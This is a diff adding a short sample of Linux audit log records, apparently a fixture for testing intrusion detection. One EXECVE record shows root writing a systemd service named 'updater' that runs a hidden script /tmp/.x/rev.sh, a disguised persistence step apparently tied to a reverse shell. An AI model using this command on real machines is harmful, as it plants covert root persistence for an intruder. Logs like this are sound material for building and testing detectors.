@@ -1,0 +1,5 @@
+type=SYSCALL msg=audit(1642281000.333:5101): arch=c000003e syscall=59 success=yes exit=0 a0=7ffdbb112233 a1=7ffdbb112250 a2=7ffdbb112260 a3=0 items=2 ppid=6101 pid=61001 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts7 ses=17 comm="bash" exe="/usr/bin/bash" key=(null)
+type=EXECVE msg=audit(1642281000.333:5101): argc=3 a0="bash" a1="-c" a2="echo '[Unit]\nDescription=updater\n[Service]\nExecStart=/tmp/.x/rev.sh\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/updater.service"
+type=CWD msg=audit(1642281000.333:5101): cwd="/root"
+type=PATH msg=audit(1642281000.333:5101): item=0 name="/usr/bin/bash" inode=345678 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0
+type=PROCTITLE msg=audit(1642281000.333:5101): proctitle=62617368002D63
